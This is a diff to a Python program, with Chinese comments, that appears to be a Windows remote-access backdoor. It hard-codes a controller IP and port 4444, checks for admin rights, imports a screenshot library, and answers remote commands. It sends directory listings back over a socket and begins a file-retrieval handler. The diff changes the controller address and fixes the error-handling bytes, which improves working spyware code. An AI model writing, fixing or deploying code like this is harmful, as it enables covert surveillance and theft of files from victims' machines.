@@ -12,7 +12,7 @@ import ctypes
 import sys
 from PIL import ImageGrab
 
-IP, PORT = '192.168.0.106', 8080
+IP, PORT = '192.168.0.105', 4444
 
 def is_admin():
     """检查是否拥有管理员权限"""
@@ -140,11 +140,12 @@ while True:
                         continue
                     if sinter_list[0]=='look':
                         try:
-                            files=win32file.listdir(sinter_list[1])
+                            files=os.listdir(sinter_list[1])
                             data=pickle.dumps(files)
                             client.sendall(f"{len(data):08d}".encode() + data)
                         except Exception as e:
-                            client.sendall(f"{len(str(e)):08d}".encode() + str(e).encode())
+                            err_bytes = str(e).encode()
+                            client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)
                     elif sinter_list[0]=='get':
                         file_path=sinter_list[1]
                         try:
